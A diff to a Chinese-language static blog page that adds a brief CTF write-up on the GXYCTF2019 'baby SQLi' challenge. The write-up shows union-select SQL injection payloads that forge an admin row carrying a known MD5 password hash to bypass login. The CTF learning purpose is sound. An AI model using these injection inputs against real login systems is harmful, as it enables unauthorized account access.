@@ -169,6 +169,65 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-3wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/01/2021-11-1-3wp/" class="post-title-link" itemprop="url">【GXYCTF2019】baby SQLi绕过MD5比较</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-01 15:18:44 / 修改时间：15:26:12" itemprop="dateCreated datePublished" datetime="2021-11-01T15:18:44+08:00">2021-11-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>随意登录<br>在search页面发现源码：select * from user where username = ‘$name<br>fuzz一下<br>过滤了（）=<br>登录admin返回wrong pass可知存在admin<br>用admin测试回显点 1’ union select 1,’admin’,3#<br>学习新知识点：<br>    union select在查找失败后会创造一个虚拟的数据，可以通过这一特性注入数据<br>user:1’ union select 1,’admin’,’123’#<br>passwd:123<br>没成功，因为密码是md5加密保存的<br>user：1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#<br>passwd：123<br>成功登录</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-1wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -985,7 +1044,7 @@ py脚本
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1017,7 +1076,7 @@ py脚本
 <div class="copyright">
   
   &copy; Tue Oct 19 2021 08:00:00 GMT+0800 (中国标准时间) – 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
